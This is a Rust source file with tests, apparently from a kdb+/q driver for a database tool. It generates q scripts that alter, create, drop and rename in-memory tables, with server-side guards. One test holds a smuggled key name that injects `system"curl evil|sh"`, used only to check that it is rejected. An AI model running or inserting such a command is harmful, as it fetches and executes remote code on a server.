//! Schema changes as q, for "Comparar esquemas", "Modificar tabla…" and
//! "Renombrar…": a table in memory is a value, so each change rebuilds it
//! and assigns it back (`t:update c:first `long$() from t`,
//! `t:delete c from t`, `t:update c:`float$c from t`, a rename with
//! `xcol`, a key with `xkey`).
//!
//! Tables of a database on disk (partitioned or splayed) are refused: each
//! column is a file, and changing one means rewriting it on the server
//! (dbmaint, `.Q.dpft`), which DBine doesn't do. Every script checks it on
//! the server too (`.Q.qp`) before changing a table, and that a table or
//! column it creates doesn't exist yet: a q assignment would replace it
//! silently.

use crate::cells::{meta_letter, type_name};
use crate::edit::{plain, qref, qstr, qsym, table_ddl};
use crate::{PARTITIONED, SPLAYED};
use dbine_driver::{
    kinds, ColumnDef, DdlParts, Error, RenameRequest, RenameSpec, RenameTarget, Result, SyncScript,
    TableChange, TableSchema,
};

const DROP: DdlParts = DdlParts {
    drop: true,
    if_exists: false,
    create: false,
    indexes: false,
    foreign_keys: false,
};

const CREATE: DdlParts = DdlParts {
    drop: false,
    if_exists: false,
    create: true,
    indexes: false,
    foreign_keys: false,
};

fn on_disk_message(name: &str) -> String {
    format!(
        "«{}» es una tabla en disco (particionada o splayed): DBine no cambia su estructura, porque cada columna es un archivo. Cambiala con q en el servidor (por ejemplo con dbmaint o .Q.dpft).",
        name
    )
}

fn exists_message(name: &str) -> String {
    format!("Ya existe «{}»: no se reemplaza.", name)
}

/// Said with every script that changes something.
const IN_MEMORY: &str = "kdb+ cambia las tablas en la memoria del proceso: para conservarlas después de reiniciarlo hay que guardarlas (save, set).";

/// What [`crate::KdbDriver::rename_spec`] answers: tables in memory and
/// their columns; q code that names them is listed, never rewritten.
pub fn rename_spec() -> RenameSpec {
    RenameSpec {
        kinds: vec![kinds::TABLE.into()],
        columns: true,
        references: dbine_driver::rename::ReferenceStyle::None,
        ..RenameSpec::default()
    }
}

fn refuse_on_disk(kind: &str, name: &str) -> Result<()> {
    if kind == PARTITIONED || kind == SPLAYED {
        Err(Error::Unsupported(on_disk_message(name)))
    } else {
        Ok(())
    }
}

/// The server-side check that `name` isn't a table on disk.
fn on_disk_guard(name: &str) -> String {
    format!(
        "if[not 0~@[{{.Q.qp get x}};{};0];'{}]",
        qsym(name),
        qstr(&on_disk_message(name))
    )
}

/// The server-side check that nothing is named `name` yet.
fn absent_guard(name: &str) -> String {
    format!(
        "if[@[{{get x;1b}};{};0b];'{}]",
        qsym(name),
        qstr(&exists_message(name))
    )
}

/// `name:expr`, or `` (`$"…") set expr `` for a name that isn't plain.
fn assign(name: &str, expr: &str) -> String {
    if plain(name) {
        format!("{name}:{expr}")
    } else {
        format!("{} set {expr}", qsym(name))
    }
}

pub(crate) fn column_name(c: &str) -> Result<&str> {
    if plain(c) && !c.contains('.') {
        Ok(c)
    } else {
        Err(Error::Unsupported(format!(
            "«{}» no es un nombre de columna que q pueda usar.",
            c
        )))
    }
}

/// A column's type as `meta` writes it: `Some(letter)`, or `None` for a
/// general list.
fn letter(table: &str, c: &ColumnDef) -> Result<Option<char>> {
    let ty = c.data_type.trim();
    if ty.eq_ignore_ascii_case("list") {
        return Ok(None);
    }
    meta_letter(ty).map(Some).ok_or_else(|| {
        Error::Unsupported(format!(
            "«{}» no es un tipo de q (columna {}.{}).",
            c.data_type, table, c.name
        ))
    })
}

/// The name of a type letter's base type (`j` and `J` → `long`).
fn base(l: char) -> &'static str {
    const LETTERS: &str = "bg xhijefcspmdznuvt";
    LETTERS
        .find(l.to_ascii_lowercase())
        .map(|i| type_name(i as i8 + 1))
        .unwrap_or("")
}

/// What a new column holds in every row: its type's null.
fn empty_value(l: Option<char>) -> String {
    match l {
        Some('C') => "count[i]#enlist \"\"".into(),
        Some(l) if l.is_ascii_uppercase() => format!("count[i]#enlist `{}$()", base(l)),
        Some(l) => format!("first `{}$()", base(l)),
        None => "count[i]#enlist ()".into(),
    }
}

/// `c` converted from type `from` to `to`, or `None` when q has no cast
/// between them.
fn cast(c: &str, from: Option<char>, to: Option<char>) -> Option<String> {
    let (a, b) = (from?, to?);
    let scalar = |l: char| l.is_ascii_lowercase();
    Some(match (a, b) {
        _ if a == b => return None,
        (a, 'C') if scalar(a) => format!("string {c}"),
        ('C', 's') => format!("`${c}"),
        ('C', 'c') => format!("first each {c}"),
        ('C', b) if scalar(b) => format!("\"{}\"${c}", b.to_ascii_uppercase()),
        ('s', 'c') => format!("first each string {c}"),
        ('s', b) if scalar(b) => format!("\"{}\"$string {c}", b.to_ascii_uppercase()),
        (a, 's') if scalar(a) => format!("`$string {c}"),
        (a, b) if scalar(a) && scalar(b) && a != 'g' && b != 'g' => {
            format!("`{}${c}", base(b))
        }
        // Lists of numbers or times: the cast goes into each cell.
        (a, b)
            if a.is_ascii_uppercase()
                && b.is_ascii_uppercase()
                && !"CGS".contains(a)
                && !"CGS".contains(b) =>
        {
            format!("`{}${c}", base(b))
        }
        _ => return None,
    })
}

fn key_of(t: &TableSchema) -> Vec<String> {
    t.primary_key
        .as_ref()
        .map(|k| k.columns.clone())
        .unwrap_or_default()
}

fn key_without_values(cols: &str) -> String {
    format!("Una tabla con clave de q necesita al menos una columna fuera de la clave: la tabla queda sin clave ({cols}).")
}

/// The key `t` can have: none when it would hold every column.
fn usable_key(t: &TableSchema, warnings: &mut Vec<String>) -> Result<Vec<String>> {
    let key = key_of(t);
    // The key goes into the script as symbols: each one must be one of the
    // table's own columns and a name q takes as is (a key named
    // `` id;system"…" `` from a compared server would otherwise be q code).
    for k in &key {
        column_name(k)?;
        if !t.columns.iter().any(|c| &c.name == k) {
            return Err(Error::Unsupported(format!(
                "la clave de {} nombra la columna «{}», que la tabla no tiene.",
                t.name, k
            )));
        }
    }
    if !key.is_empty() && t.columns.iter().all(|c| key.contains(&c.name)) {
        warnings.push(key_without_values(&key.join(", ")));
        return Ok(Vec::new());
    }
    Ok(key)
}

/// `` `a`b `` for `xkey`: names already checked by [`usable_key`].
fn symbols(names: &[String]) -> String {
    names.iter().map(|n| format!("`{n}")).collect()
}

pub fn script(changes: &[TableChange]) -> Result<SyncScript> {
    let (mut drops, mut alters, mut creates) = (Vec::new(), Vec::new(), Vec::new());
    let mut warnings = Vec::new();
    for ch in changes {
        match ch {
            TableChange::Drop { table } => {
                refuse_on_disk(&table.kind, &table.name)?;
                warnings.push(format!(
                    "Se borra la tabla {} con todos sus datos.",
                    table.name
                ));
                drops.push(on_disk_guard(&table.name));
                drops.push(table_ddl(table, DROP)?);
            }
            TableChange::Create { table } => {
                for c in &table.columns {
                    column_name(&c.name)?;
                    letter(&table.name, c)?;
                }
                let mut t = table.clone();
                if usable_key(table, &mut warnings)?.is_empty() {
                    t.primary_key = None;
                }
                creates.push(absent_guard(&t.name));
                creates.push(table_ddl(&t, CREATE)?);
                creates.extend(crate::attrs::create(&t)?);
            }
            TableChange::Alter { old, new } => {
                refuse_on_disk(&old.kind, &old.name)?;
                alter(old, new, &mut alters, &mut warnings)?;
            }
        }
    }
    let statements: Vec<String> = drops.into_iter().chain(alters).chain(creates).collect();
    if !statements.is_empty() {
        warnings.push(IN_MEMORY.into());
    }
    Ok(SyncScript {
        statements,
        warnings,
    })
}

fn alter(
    old: &TableSchema,
    new: &TableSchema,
    out: &mut Vec<String>,
    warnings: &mut Vec<String>,
) -> Result<()> {
    let name = new.name.as_str();
    let r = qref(name);
    let same = |a: &ColumnDef, b: &ColumnDef| a.name == b.name;
    let dropped: Vec<&ColumnDef> = old
        .columns
        .iter()
        .filter(|o| !new.columns.iter().any(|n| same(o, n)))
        .collect();
    let mut added = Vec::new();
    let mut casts = Vec::new();
    let mut recast = Vec::new();
    for n in &new.columns {
        column_name(&n.name)?;
        let to = letter(name, n)?;
        match old.columns.iter().find(|o| same(o, n)) {
            None => added.push(assign(
                name,
                &format!("update {}:{} from {r}", n.name, empty_value(to)),
            )),
            Some(o) => {
                let from = letter(name, o)?;
                if from == to {
                    continue;
                }
                match cast(&n.name, from, to) {
                    Some(e) => {
                        warnings.push(format!(
                            "La columna {}.{} pasa de {} a {}: los valores que no se puedan convertir quedan nulos.",
                            name, n.name, o.data_type, n.data_type
                        ));
                        casts.push(assign(name, &format!("update {}:{e} from {r}", n.name)));
                        recast.push(n.name.as_str());
                    }
                    None => warnings.push(format!(
                        "La columna {}.{} no se convierte de {} a {}: q no tiene un cast directo entre esos tipos; cambiala a mano.",
                        name, n.name, o.data_type, n.data_type
                    )),
                }
            }
        }
    }
    let old_key = key_of(old);
    let new_key = usable_key(new, warnings)?;
    let key_changed = old_key != new_key;
    // Attributes go on after the casts (a cast takes them off).
    let gone: Vec<&str> = dropped.iter().map(|c| c.name.as_str()).collect();
    let attrs = crate::attrs::alter(old, new, &gone, &recast, warnings)?;
    let changes = !dropped.is_empty() || !added.is_empty() || !casts.is_empty();
    if !changes && !key_changed && attrs.is_empty() {
        return Ok(());
    }
    out.push(on_disk_guard(name));
    // Columns change on the unkeyed table (a keyed one can't lose its last
    // value column, nor change a key column in place); the key goes back
    // at the end.
    let unkeyed = !old_key.is_empty() && (changes || key_changed);
    if unkeyed {
        out.push(assign(name, &format!("0!{r}")));
    }
    if !dropped.is_empty() {
        let cols: Vec<&str> = dropped
            .iter()
            .map(|c| column_name(&c.name))
            .collect::<Result<_>>()?;
        for c in &dropped {
            warnings.push(format!(
                "Se borra la columna {}.{} con sus datos.",
                name, c.name
            ));
        }
        out.push(assign(name, &format!("delete {} from {r}", cols.join(","))));
    }
    out.extend(added);
    out.extend(casts);
    out.extend(attrs);
    if !new_key.is_empty() && (unkeyed || key_changed) {
        out.push(assign(name, &format!("{} xkey {r}", symbols(&new_key))));
    }
    Ok(())
}

/// "Renombrar…": a table in memory (copied to the new name, then the old
/// one deleted) or one of its columns (`xcol`).
pub fn rename(req: &RenameRequest) -> Result<SyncScript> {
    let new = req.new_name.as_str();
    let statements = match &req.target {
        RenameTarget::Column { table, column } => {
            refuse_on_disk(&table.kind, &table.name)?;
            let (old, new) = (column_name(column)?, column_name(new)?);
            let (name, r) = (table.name.as_str(), qref(&table.name));
            vec![
                on_disk_guard(name),
                format!("if[`{new} in cols {r};'{}]", qstr(&exists_message(new))),
                assign(
                    name,
                    &format!("@[cols {r};where cols[{r}]=`{old};:;`{new}] xcol {r}"),
                ),
            ]
        }
        RenameTarget::Object { object, .. } if object.kind == kinds::TABLE => {
            let old = TableSchema {
                name: object.name.clone(),
                ..Default::default()
            };
            vec![
                on_disk_guard(&object.name),
                absent_guard(new),
                assign(new, &qref(&object.name)),
                table_ddl(&old, DROP)?,
            ]
        }
        RenameTarget::Object { object, .. } => {
            refuse_on_disk(&object.kind, &object.name)?;
            return Err(Error::Unsupported("este motor no renombra objetos".into()));
        }
        _ => return Err(Error::Unsupported("este motor no renombra objetos".into())),
    };
    Ok(SyncScript {
        statements,
        warnings: vec![IN_MEMORY.into()],
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use dbine_driver::{KeyDef, ObjectRef};

    fn col(n: &str, ty: &str) -> ColumnDef {
        ColumnDef {
            name: n.into(),
            data_type: ty.into(),
            ..Default::default()
        }
    }

    fn table(name: &str, cols: Vec<ColumnDef>, key: &[&str]) -> TableSchema {
        TableSchema {
            kind: kinds::TABLE.into(),
            name: name.into(),
            columns: cols,
            primary_key: (!key.is_empty()).then(|| KeyDef {
                name: None,
                columns: key.iter().map(|k| k.to_string()).collect(),
            }),
            ..Default::default()
        }
    }

    fn guard(t: &str) -> String {
        on_disk_guard(t)
    }

    #[test]
    fn columns_are_added_dropped_and_cast() {
        let old = table(
            "trade",
            vec![
                col("sym", "symbol"),
                col("px", "long"),
                col("note", "string"),
                col("gone", "int"),
            ],
            &[],
        );
        let new = table(
            "trade",
            vec![
                col("sym", "string"),
                col("px", "float"),
                col("note", "symbol"),
                col("size", "long"),
                col("tags", "symbol list"),
                col("memo", "string"),
            ],
            &[],
        );
        let s = script(&[TableChange::Alter { old, new }]).unwrap();
        assert_eq!(
            s.statements,
            [
                guard("trade"),
                "trade:delete gone from trade".to_string(),
                "trade:update size:first `long$() from trade".into(),
                "trade:update tags:count[i]#enlist `symbol$() from trade".into(),
                "trade:update memo:count[i]#enlist \"\" from trade".into(),
                "trade:update sym:string sym from trade".into(),
                "trade:update px:`float$px from trade".into(),
                "trade:update note:`$note from trade".into(),
            ]
        );
        assert!(s.warnings.iter().any(|w| w.contains("trade.gone")));
        assert_eq!(
            s.warnings
                .iter()
                .filter(|w| w.contains("los valores que no se puedan convertir"))
                .count(),
            3
        );
        assert_eq!(s.warnings.last().unwrap(), IN_MEMORY);
    }

    #[test]
    fn casts_between_q_types() {
        let c = |a: &str, b: &str| cast("c", meta_letter(a), meta_letter(b));
        assert_eq!(c("string", "long").unwrap(), "\"J\"$c");
        assert_eq!(c("symbol", "date").unwrap(), "\"D\"$string c");
        assert_eq!(c("long", "symbol").unwrap(), "`$string c");
        assert_eq!(c("symbol", "char").unwrap(), "first each string c");
        assert_eq!(c("string", "char").unwrap(), "first each c");
        assert_eq!(c("timestamp", "date").unwrap(), "`date$c");
        assert_eq!(c("long list", "float list").unwrap(), "`float$c");
        assert_eq!(c("guid", "string").unwrap(), "string c");
        assert_eq!(c("string", "guid").unwrap(), "\"G\"$c");
        assert!(c("guid", "long").is_none());
        assert!(c("long list", "long").is_none());
        assert!(c("long list", "string").is_none());
        assert!(cast("c", None, meta_letter("long")).is_none());
        assert!(c("long", "long").is_none());
    }

    #[test]
    fn keys_come_off_and_go_back() {
        let old = table("t", vec![col("id", "long"), col("v", "symbol")], &["id"]);
        let new = table(
            "t",
            vec![col("id", "int"), col("v", "symbol"), col("w", "float")],
            &["id", "v"],
        );
        let s = script(&[TableChange::Alter { old, new }]).unwrap();
        assert_eq!(
            s.statements,
            [
                guard("t"),
                "t:0!t".to_string(),
                "t:update w:first `float$() from t".into(),
                "t:update id:`int$id from t".into(),
                "t:`id`v xkey t".into(),
            ]
        );
        // Only the key changes.
        let old = table("t", vec![col("id", "long"), col("v", "symbol")], &[]);
        let new = table("t", vec![col("id", "long"), col("v", "symbol")], &["id"]);
        let s = script(&[TableChange::Alter { old, new }]).unwrap();
        assert_eq!(s.statements, [guard("t"), "t:`id xkey t".to_string()]);
        // A key of every column can't be: the table stays unkeyed.
        let old = table("t", vec![col("a", "long"), col("b", "long")], &["a"]);
        let new = table("t", vec![col("a", "long"), col("b", "long")], &["a", "b"]);
        let s = script(&[TableChange::Alter { old, new }]).unwrap();
        assert_eq!(s.statements, [guard("t"), "t:0!t".to_string()]);
        assert!(s.warnings[0].contains("(a, b)"));
    }

    #[test]
    fn nothing_to_do_writes_nothing() {
        let t = table("t", vec![col("a", "long")], &[]);
        let mut u = t.clone();
        u.columns[0].data_type = "Long".into();
        let s = script(&[TableChange::Alter { old: t, new: u }]).unwrap();
        assert!(s.statements.is_empty() && s.warnings.is_empty());
    }

    #[test]
    fn tables_are_created_and_dropped_with_checks() {
        let t = table(
            "quote",
            vec![col("sym", "symbol"), col("bid", "float")],
            &["sym"],
        );
        let s = script(&[
            TableChange::Create { table: t.clone() },
            TableChange::Drop {
                table: table("old", vec![col("a", "long")], &[]),
            },
        ])
        .unwrap();
        assert_eq!(
            s.statements,
            [
                guard("old"),
                "![`.;();0b;enlist `old]".to_string(),
                absent_guard("quote"),
                "quote:([sym:`symbol$()] bid:`float$())".into(),
            ]
        );
        assert!(absent_guard("quote").starts_with("if[@[{get x;1b};`quote;0b];'\"Ya existe"));
        assert!(guard("quote").starts_with("if[not 0~@[{.Q.qp get x};`quote;0];'\""));
        assert!(s.warnings[0].contains("old"));
        // Names that aren't plain go through `set`.
        let odd = table("my quotes", vec![col("a", "long")], &[]);
        let s = script(&[
            TableChange::Alter {
                old: odd.clone(),
                new: table("my quotes", vec![col("a", "long"), col("b", "date")], &[]),
            },
            TableChange::Create { table: odd },
        ])
        .unwrap();
        assert_eq!(
            s.statements[1],
            "(`$ \"my quotes\") set update b:first `date$() from (get `$ \"my quotes\")"
        );
        assert_eq!(s.statements[3], "(`$ \"my quotes\") set ([] a:`long$())");
    }

    #[test]
    fn refused_and_wrong_input() {
        let mut t = table("hdb", vec![col("a", "long")], &[]);
        t.kind = PARTITIONED.into();
        let e = script(&[TableChange::Alter {
            old: t.clone(),
            new: t.clone(),
        }])
        .unwrap_err();
        assert!(e.to_string().contains("tabla en disco"), "{e}");
        t.kind = SPLAYED.into();
        assert!(script(&[TableChange::Drop { table: t }]).is_err());
        let bad = table("t", vec![col("a", "varchar(20)")], &[]);
        assert!(script(&[TableChange::Create { table: bad }])
            .unwrap_err()
            .to_string()
            .contains("no es un tipo de q"));
        let bad = table("t", vec![col("a b", "long")], &[]);
        assert!(script(&[TableChange::Create { table: bad }]).is_err());
        // A general list takes no cast: said, not run.
        let s = script(&[TableChange::Alter {
            old: table("t", vec![col("a", "list")], &[]),
            new: table("t", vec![col("a", "long")], &[]),
        }])
        .unwrap();
        assert!(s.statements.is_empty());
        assert!(s.warnings[0].contains("cambiala a mano"));
    }

    #[test]
    fn renames() {
        let tref = |kind: &str, name: &str| ObjectRef {
            kind: kind.into(),
            schema: None,
            name: name.into(),
        };
        let req = |target, new: &str| RenameRequest {
            target,
            new_name: new.into(),
            table: None,
            definition: None,
        };
        let s = rename(&req(
            RenameTarget::Column {
                table: tref(kinds::TABLE, "t"),
                column: "px".into(),
            },
            "price",
        ))
        .unwrap();
        assert_eq!(
            s.statements[2],
            "t:@[cols t;where cols[t]=`px;:;`price] xcol t"
        );
        assert!(s.statements[1].starts_with("if[`price in cols t;'\"Ya existe"));
        let s = rename(&req(
            RenameTarget::Object {
                object: tref(kinds::TABLE, ".ns.t"),
                parent: None,
            },
            ".ns.u",
        ))
        .unwrap();
        assert_eq!(
            s.statements[2..],
            [".ns.u:.ns.t", "![`.ns;();0b;enlist `t]"]
        );
        assert!(rename(&req(
            RenameTarget::Column {
                table: tref(SPLAYED, "s"),
                column: "a".into(),
            },
            "b",
        ))
        .is_err());
        assert!(rename(&req(
            RenameTarget::Object {
                object: tref(kinds::VIEW, "v"),
                parent: None,
            },
            "w",
        ))
        .is_err());
        assert!(rename_spec().columns);
    }

    #[test]
    fn key_names_from_another_server_are_checked() {
        // A key that isn't a plain column name (q code in a compared
        // server's key) or names a column the table lacks never reaches
        // the script.
        let old = table("trade", vec![col("id", "symbol"), col("px", "float")], &[]);
        let evil = "id;system\"curl evil|sh\";`id";
        for key in [evil, "nope"] {
            let new = table(
                "trade",
                vec![col("id", "symbol"), col("px", "float")],
                &[key],
            );
            let e = script(&[TableChange::Alter {
                old: old.clone(),
                new: new.clone(),
            }]);
            assert!(e.is_err(), "{key}: {e:?}");
            let e = script(&[TableChange::Create { table: new }]);
            assert!(e.is_err(), "{key}: {e:?}");
        }
        let new = table(
            "trade",
            vec![col("id", "symbol"), col("px", "float")],
            &["id"],
        );
        let s = script(&[TableChange::Alter { old, new }]).unwrap();
        assert!(
            s.statements.iter().any(|st| st.contains("`id xkey")),
            "{s:?}"
        );
    }
}
